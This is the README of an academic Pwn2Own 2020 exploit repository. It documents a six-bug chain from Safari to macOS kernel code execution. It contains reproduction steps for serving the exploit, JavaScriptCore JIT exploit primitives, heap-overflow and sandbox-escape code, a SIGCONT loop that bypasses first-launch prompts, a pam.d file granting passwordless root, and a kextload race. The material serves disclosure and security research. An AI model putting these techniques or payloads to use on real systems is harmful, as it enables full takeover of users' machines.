Compromising the macOS Kernel through Safari by Chaining Six Vulnerabilities
======================================================================================

Overview
---------
This repository contains exploitation and technical details of [our Pwn2Own
2020 winning submission targeting Apple Safari with a kernel escalation
of privilege for macOS 10.15.3](https://www.thezdi.com/blog/2020/3/17/welcome-to-pwn2own-2020-the-schedule-and-live-results).
For further information, you can also check [our Blackhat USA 2020
slides](https://gts3.org/assets/papers/2020/jin:pwn2own2020-safari-slides.pdf).
This repository also includes [our demo video](./movie.mov) for the succesful
exploitation.


How to reproduce
-----------------

1. Run the HTTP server using python3 in the exploits folder.

```shell
$ python3 -m http.server 80
```

2. Access the website with attacker server's IP with Safari:

```
http://[attacker_ip]/exploit.html
```

3. Wait for Calculator (usually popped in ten seconds, but if unlucky, it will
take some time) and a terminal with kernel privilege. To show our kernel
privilege escalation, we disabled SIP. You can check by running the
`csrutil status` command, which will show `disabled`.


Build from source
-----------------
For your convenience, we provided a compiled payload, `payload.js`. But, if you
want, you can build it by yourself. Note that this will take a very long time
because we will build WebKit as a part of our exploit chain. It is worth to noting
that we only tested our building process in Mac OS.

```shell
# Install xcode first
$ python3 -m pip install --user lief
$ make
```

Technical details
-----------------

To make this exploit, we chained the following *SIX* vulnerabilities.

### 1. Remote code execution in Safari via incorrect side-effect modeling of 'in' operator in JavaScriptCore DFG compiler

- Root cause analysis

In JavaScriptCore, when an indexed property was queried with 'in' operator,
the DFG compiler assumes that it is side-effect free unless there is a proxy
object in its prototype chain that can intercept this operation.
JavaScriptCore marks an object that can intercept this indexed property
access using the flag called 'MayHaveIndexedAccessors'. This flag is
explicitly marked for the Proxy object.

```javascript
0 in [] // side-effect free

let arr = [];
arr.__proto__ = new Proxy({}, {});
0 in arr // can cause side-effect!
```

However, there is another object that can cause side-effect:
JSHTMLEmbedElement that implements its own getOwnPropertySlot() method. One
way to trigger JavaScript callbacks (i.e. side effects) with 'in' operator is
using `<embed>` element with PDF plugin; when any property is queried on
embed / object tag's DOM object, it tries to load the backed plugin and
DOMSubtreeModified event handler can be called in PDF plugin's case because
it uses appendChild method on body element.

This is the stack trace of calling the side-effect from getOwnPropertySlot().

```txt
Stack trace
    #1 0x1c1463dbb in WebKit::PDFPlugin::PDFPlugin(WebKit::WebFrame&) (.../WebKit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x1463dbb)
    #2 0x1c144cac7 in WebKit::PDFPlugin::create(WebKit::WebFrame&) (.../WebKit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x144cac7)
    #3 0x1c1b65d48 in WebKit::WebPage::createPlugin(WebKit::WebFrame*, WebCore::HTMLPlugInElement*, WebKit::Plugin::Parameters const&, WTF::String&) (.../WebKit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x1b65d48)
    #4 0x1c18cddc4 in WebKit::WebFrameLoaderClient::createPlugin(WebCore::IntSize const&, WebCore::HTMLPlugInElement&, WTF::URL const&, WTF::Vector<WTF::String, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&, WTF::Vector<WTF::String, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&, WTF::String const&, bool) (.../WebKit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x18cddc4)
    #5 0x1cfb3f224 in WebCore::SubframeLoader::loadPlugin(WebCore::HTMLPlugInImageElement&, WTF::URL const&, WTF::String const&, WTF::Vector<WTF::String, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&, WTF::Vector<WTF::String, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&, bool) (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3d01224)
    #6 0x1cfb3f62c in WebCore::SubframeLoader::requestObject(WebCore::HTMLPlugInImageElement&, WTF::String const&, WTF::AtomString const&, WTF::String const&, WTF::Vector<WTF::String, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&, WTF::Vector<WTF::String, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&) (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3d0162c)
    #7 0x1cf424c85 in WebCore::HTMLPlugInImageElement::requestObject(WTF::String const&, WTF::String const&, WTF::Vector<WTF::String, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&, WTF::Vector<WTF::String, 0ul, WTF::CrashOnOverflow, 16ul, WTF::FastMalloc> const&) (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x35e6c85)
    #8 0x1cf300912 in WebCore::HTMLEmbedElement::updateWidget(WebCore::CreatePlugins) (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x34c2912)
    #9 0x1cfd0a57e in WebCore::FrameView::updateEmbeddedObject(WebCore::RenderEmbeddedObject&) (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3ecc57e)
    #10 0x1cfd0a807 in WebCore::FrameView::updateEmbeddedObjects() (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3ecc807)
    #11 0x1cfcf19c7 in WebCore::FrameView::updateEmbeddedObjectsTimerFired() (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3eb39c7)
    #12 0x1cedbd595 in WebCore::Document::updateLayoutIgnorePendingStylesheets(WebCore::Document::RunPostLayoutTasks) (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2f7f595)
    #13 0x1cf41b681 in WebCore::HTMLPlugInElement::renderWidgetLoadingPlugin() const (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x35dd681)
    #14 0x1cf2ffc2d in WebCore::HTMLEmbedElement::renderWidgetLoadingPlugin() const (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x34c1c2d)
    #15 0x1cf41ad77 in WebCore::HTMLPlugInElement::pluginWidget(WebCore::HTMLPlugInElement::PluginLoadingPolicy) const (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x35dcd77)
    #16 0x1ce7b3e26 in WebCore::pluginScriptObjectFromPluginViewBase(WebCore::HTMLPlugInElement&, JSC::JSGlobalObject*) (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2975e26)
    #17 0x1ce7b3dca in WebCore::pluginScriptObject(JSC::JSGlobalObject*, WebCore::JSHTMLElement*) (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2975dca)
    #18 0x1ce7b4023 in WebCore::pluginElementCustomGetOwnPropertySlot(WebCore::JSHTMLElement*, JSC::JSGlobalObject*, JSC::PropertyName, JSC::PropertySlot&) (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2976023)
    #19 0x1cca3e913 in WebCore::JSHTMLEmbedElement::getOwnPropertySlot(JSC::JSObject*, JSC::JSGlobalObject*, JSC::PropertyName, JSC::PropertySlot&) (.../WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xc00913)
    #20 0x1e946dd6c in llint_slow_path_get_by_id (.../WebKit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x232ad6c)
```

Since any objects in the prototype chain is not marked with
"MayHaveIndexedAccessors", JIT assumes that this use of 'in' operator doesn't
have any transitions inside eliminating the array type checks after
transition.

```javascript
// In the frame of <iframe src="...pdf"></iframe>

function opt(arr) {
	arr[0] = 1.1;
	100 in arr; // 100 not exists in arr, making it check __proto__
	return arr[0]
}

for(var i = 0; i < 10000; i++) opt([1.1])
arr.__proto__ = document.querySelector('embed')

document.body.addEventListener('DOMSubtreeModified', () => {
	arr[0] = {}
})

document.body.removeChild(embed)
opt([1.1]) // leaks address of {} as double value
```

By constructing addrof/fakeobj primitive from this, we could make arbitrary
RW primitive to get code execution with the JIT-compiled JavaScript function.


- Exploitation

After getting addrof/fakeobj primitives, we convert it to more stable
addrof/fakeobj primitives by faking an object.

```javascript
hostObj = {
                                                            // hostObj.structureId
                                                            // hostObj.butterfly
    _: 1.1,                                                 // dummy
    length: (new Int64('0x4141414141414141')).asDouble(),
                                                            // -> fakeHostObj = fakeObj(addressOf(hostObj) + 0x20)
    id: (new Int64('0x0108191700000000')).asJSValue(),
    butterfly: null,
    o: {},
    executable:{
      a:1, b:2, c:3, d:4, e:5, f:6, g:7, h:8, i:9,          // Padding (offset: 0x58)
      unlinkedExecutable:{
        isBuiltinFunction: 1 << 31,
        a:0, b:0, c:0, d:0, e:0, f:0,                       // Padding (offset: 0x48)
        identifier: null
      }
    },
                                                            // -> fakeIdentifier = fakeObj(addressOf(hostObj) + 0x40)
    strlen_or_id: (new Int64('0x10')).asDouble(),           // String.size
    target: hostObj                                         // String.data_ptr
}

hostObj.executable.unlinkedExecutable.identifier = fakeIdentifier
Function.prototype.toString(fakeHostObj) // function [leaked-structure-id]() { [native code] }
```

We leak the structure id of the hostObj by making fake function object
fakeHostObj and calling Function.prototype.toString on it. The name of
function reflects the structure id value as UTF-16 string. We update the
hostObj after leaking the structure id. It is worth to noting that this
technique is from [Yong Wang's Blackhat EU 2019
talk](https://www.blackhat.com/eu-19/briefings/schedule/#thinking-outside-the-jit-compiler-understanding-and-bypassing-structureid-randomization-with-generic-and-old-school-methods-17513).

```javascript
hostObj = {
                                                            // hostObj.structureId
                                                            // hostObj.butterfly
    _: 1.1,                                                 // dummy
    length: (new Int64('0x4141414141414141')).asDouble(),
                                                            // -> fakeHostObj = fakeObj(addressOf(hostObj) + 0x20)
    id: leakStructureId.asDouble(),                         // fakeHostObj.structureId
    butterfly: fakeHostObj,                                 // fakeHostObj.butterfly
    o: {},
    ...
}
```

Now we have fakeHostObj's butterfly pointing fakeHostObj itself.  We can use
addrof/fakeobj primitive without triggering the bug again since we can access
hostObj.o as JSValue or as double using fakeHostObj[2].

Using leaked structure id of attackObj and addrof/fakeobj primitive, we can
craft objects like below.

```javascript
rwObj = {
                                                            // rwObj.structureId
                                                            // rwObj.butterfly
    _: 1.1,                                                 // dummy
    length: (new Int64('0x4141414141414141')).asDouble(),
                                                            // fakeRwObj = fakeObj(addressOf(rwObj) + 0x20)
    id: leakStructureId.asDouble(),                         // fakeRwObj.structureId
    butterfly: fakeRwObj,                                   // fakeRwObj.butterfly

    __: 1.1,                                                // dummy
    innerLength: (new Int64('0x4141414141414141')).asDouble(),
                                                            // fakeInnerObj = fakeObj(addressOf(rwObj) + 0x40)
    innerId: leakStructureId.asDouble(),                    // fakeInnerObj.structureId
    innerButterfly: fakeInnerObj,                           // fakeInnerObj.butterfly
}
```

We can get arbitrary RW primitive using the fakeRwObj to update
fakeInnerObj's butterfly pointer and read/write from/to fakeInnerObj. To get
RCE from arbitrary RW primitive, we trigger the JIT compilation of the dummy
function, leak the code address, overwrite it with our shellcode.  Sometimes,
code address leak fails because we can't read/write certain values from our
fake array. In that case, we try to approximate it by reading from pointer
location + 1 and shifting the read value.  Finally, we overwrite the code
pointer of the alert function to our dummy function code pointer and call it
(with some arguments) to execute the shellcode.


### 2. Arbitrary .app launching in Safari via symbolic link in didFailProvisionalLoad()

For file:// URL, Safari opens Finder window with [NSWorkspace selectFile:inFileViewerRootedAtPath:].
This function accepts two parameters, and in most cases, Safari only uses the
first parameter, which shows the containing folder of the specified file. But
if the second parameter is used instead, the Finder launches the file if it is
executable or an app bundle.

Safari uses the second parameter after confirming that the pointed path is not
application bundle --- directory with .app suffix. Since a symbolic link can
point to the application bundle, but this is not a directory with .app suffix.
Thus, Safari will launch the application pointed by the symbolic link. This
code path can be triggered by sending didFailProvisionalLoad() IPC message.

However, Safari itself cannot create a symbolic link due to system call filter
of the Seatbelt sandbox. So we use another vulnerability that gives root, but
sandboxed code execution.


### 3. Arbitrary code execution in CVM (Core Virtual Machine) Service via heap overflow

There is a sandboxed XPC service named com.apple.cvmsServ (i.e. CVMServer),
which compiles shader for various architectures. It is part of built-in
OpenGL framework.

For requests with "message" field set to 4, CVMServer parses user-specified
"framework data" and "maps". The "maps" data file is located at
"/System/Library/Caches/com.apple.CVMS/%s.%s.%u.maps" - first %s is
user-specified without any filters. So directory traversal is possible; we
can make it parse the file created within the Safari's sandbox.

```c
    FILE *fp = fopen(&framework_name_, "r");
    ...
    Header *header = malloc(0x50);
    fread(header, 0x50, 1, v132);
    ...
    items_offset = header->items_offset;
    items_count = header->items_count;
    header = realloc(header, 56 * items_count + items_offset);
    fread(&header->char50, items_offset + 56 * items_count - 0x50, 1, v132);
```

If `item_count * 56 + items_offset <= 0x50`, fread() will receive underflowed
length near 2^64, so it becomes heap overflow with arbitrary length payload.
Note that fread() stops when the end of specified file is reached.

By utilizing this, we could overwrite the heap object related to connection,
which could modify the pointers mentioned below:

```c
case 7: // "message" == 7
    v34 = xpc_dictionary_get_uint64(input, "heap_index");
    v11 = cvmsServerServiceGetMemory(a1a->session, v34, &port, &size);
    if ( v11 )
        goto error;
    xpc_dictionary_set_mach_send(reply, "vm_port", port);

__int64 __fastcall cvmsServerServiceGetMemory(xpc_session *a1, unsigned __int64 index, _DWORD *port, _QWORD *a4)
{
  Pool *pool; // rax
  unsigned int v7; // ebx
  heapitem *v8; // rax

  pthread_mutex_lock((&server_globals + 2));
  // a1->attachedService is controlled value
  pool = a1->attachedService->context->pool_ptr;
  v7 = 521;
  if ( pool->pointersCount > index )
  {
    v8 = pool->pointers;
    *port = v8[index].port;
    *a4 = v8[index].size;
    v7 = 0;
  }
  pthread_mutex_unlock((&server_globals + 2));
  return v7;
}
```

If the "port" value is 0x103 (TASK-SELF), the service will grant the client the
send right of CVMServer's task port, which can be used to allocate memory, and
execute arbitrary code on the process. To make v8[index].port == 0x103, we
searched the memory on the library area, which have the same addresses across
the processes.

```txt
rax := UserInput
[rax+0x38] = X
[X+0x30] = Length (UINT64_MAX)
[X+0x28] = Y (0)
[Y+0x18*index+0x10] = 0x103 (== mach_task_self_)
```

There were many areas that had two 64-bit integer value 0, -1, and for rax+0x38
and X+0x30, we found that `_xpc_error_termination_imminent`, which is public
symbol, satisfies this condition. Since length is larger than 2^64 / 0x10, we
could calculate modular inverse to point `Y(==0)*0x18+index+0x10 == &0x103`.

Since CVMServer had com.apple.security.cs.allow-jit set, we could call mmap
with MAP_JIT flag and invoke our reflective loader to execute dylib files on
the process. We ran this code on CVMServer:

```c
  // In /var/db/CVMS (writable folder)

  char randbuf[0x1000];
  sprintf(randbuf, "%lu.app", clock());
  symlink(randbuf, "my.app");

  // Create a valid application at my.app
```

After creating %lu.app and symbolic link my.app, we returned to Safari and sent
the IPC message to open the app. But there were two more protections: quarantine
check and opening-the-app-for-the-first-time check.

### 4. macOS first-time app protection bypass

If Safari tries to execute an app for the first time, Safari denies its
execution if the file has an attribute called com.apple.quarantine or waits a
user's confirmation. All files created by WebProcess has the attribute ---
com.apple.quarantine, however, we already can bypass this because we created
the folder in CVMServer process, not in WebProcess. For the user's
confirmation, macOS first creates the process, suspends it, and continue
the process after user clicks `Open` button. But sending SIGCONT signal worked
as same as clicking the button.

Thus, we ran this code continuously in CVMServer after creating my.app:

```c
    for(int i = 0; i < 65536; i++)
        kill(i, SIGCONT);
```

### 5. Root privilege escalation in cfprefsd via arbitrary file / folder permission modification caused by a race condition

cfprefsd is another XPC service that allows a user to create plist file. It
is located at CoreFoundation and is recheable from most unsandboxed process.
Since we already got unsandboxed privilege for a normal user (i.e.,
CVMServer), we can request it to create plist file if the target folder and
file has sufficient permission bits that allows the client user to write to
the file. However, if the folder does not exist, it creates the folder of the
plist file recursively.

Here is a code snippet from CVMServer that creates the folder.

```c
_CFPrefsCreatePreferencesDirectory(path) {
    for(slice in path.split("/")) {
        cur += slice
        if(!mkdir(cur, 0777) || errno in (EEXIST, EISDIR)) {
            chmod(cur, perm)
            chown(cur, client_id, client_group)
        } else break
    }
}
```

But if a path points user-writable directory, a user can replace the directory
pointed by `cur`, and replace it with symbolic link to arbitrary file/folder.
Since cfprefsd has root privilege, it is possible to change the owner of the
folders like /etc/pam.d. By changing the owner of /etc/pam.d, we can write
/etc/pam.d/login with the content below:

```txt
auth       optional       pam_permit.so
auth       optional       pam_permit.so
auth       optional       pam_permit.so
auth       required       pam_permit.so
account    required       pam_permit.so
account    required       pam_permit.so
password   required       pam_permit.so
session    required       pam_permit.so
session    required       pam_permit.so
session    optional       pam_permit.so
```

Then `login root` command will give the user root shell without any
authentication.

### 6. Kernel privilege escalation using module staging bypass and race condition in kextload

kextload is one of programs that can perform kext (Kernel Extension) operations
in macOS. By running `kextload [path of .kext folder]`, a root user can load a
signed kext from user mode. To prevent an unsigned or an invalid signed kexts,
kextload sets 'authenticator' callback in IOKitUser package. Unfortunately, the
path of the kext is the only available resource for the callback, race
condition is hard to prevent. To mitigate this, kextload first copies the kext
folder into the dedicated space -- /Library/StagedExtensions --- which cannot
be modified even with root privilege thanks to SIP and the entitlement
mechanism.

kextload works as follows. If we execute `kextload /tmp/A.kext`, kextload
copies the original kext folder to /Library/StagedExtensions/tmp/[UUID].kext.
Then, kextload checks signs of all files in the folder. If this fails, it
deletes the folder. Otherwise, it copies the folder to
/Library/StagedExtensions/tmp/A.kext and load this module.

```txt
$ kextload /tmp/A.kext
    -> copy to /Library/StagedExtensions/tmp/[UUID].kext
    -> validate signatures. if failed, delete the directory
    -> if succeeded, copy to /Library/StagedExtensions/tmp/A.kext
    -> load the kext
```

One issue in kextload is that this process can be terminated with a root
privilege user. It is worth noting that the aforementioned copy includes
symbolic link, which will be validated later. However, if we kill the kextload
process before the validation, we can preserve an invalid kext with a symbolic
link in the /Library/StagedExtensions.

```txt
# assume /tmp/A.kext/symlink -> /tmp/
$ kextload /tmp/A.kext
    -> copy to /Library/StagedExtensions/tmp/[UUID].kext
    -> kill this process
    -> then, /Library/StagedExtensions/tmp/[UUID].kext/symlink will be remained
```

After this, if we execute another kextload command with
`kextload /tmp/[UUID].kext/symlink/B.kext`, B.kext will be copied to the writable
location for a root privilege user (e.g., /tmp/[UUID'].kext)

```
$ kextload /tmp/[UUID].kext/symlink/B.kext
    -> copy to /Library/StagedExtensions/tmp/[UUID].kext/symlink/[UUID'].kext
    -> since symlink -> /tmp, this is equal to /tmp/[UUID'].kext.
```

After copying, kextload checks if it is located at secure location, which is
`/Library/StagedExtensions/*`. We can temporarily place the symbolic link at
/tmp/A.kext to point /Library/StagedExtensions/[path of valid kext]. After
validation, we can replace the module binary into a unsigned kernel module, to
get kernel code execution.

To make race reliable, we used sandbox-exec to stop the program at the file
access with the specified suffix.


Authors
-------
- Yonghwi Jin (jinmoteam@gmail.com)
- Jungwon Lim (setuid0@protonmail.com)
- Insu Yun (insu@gatech.edu)
- Taesoo Kim (taesoo@gatech.edu)

Citation
--------
```txt
@inproceedings{jin:pwn2own2020-safari,
  title        = {{Compromising the macOS kernel through Safari by chaining six vulnerabilities}},
  author       = {Yonghwi Jin and Jungwon Lim and Insu Yun and Taesoo Kim},
  booktitle    = {Black Hat USA Briefings (Black Hat USA)},
  month        = aug,
  year         = 2020,
  address      = {Las Vegas, NV},
}
```

Reference
---------
- https://github.com/saelo/pwn2own2018
- https://github.com/LinusHenze/WebKit-RegEx-Exploit
- https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html
- https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf
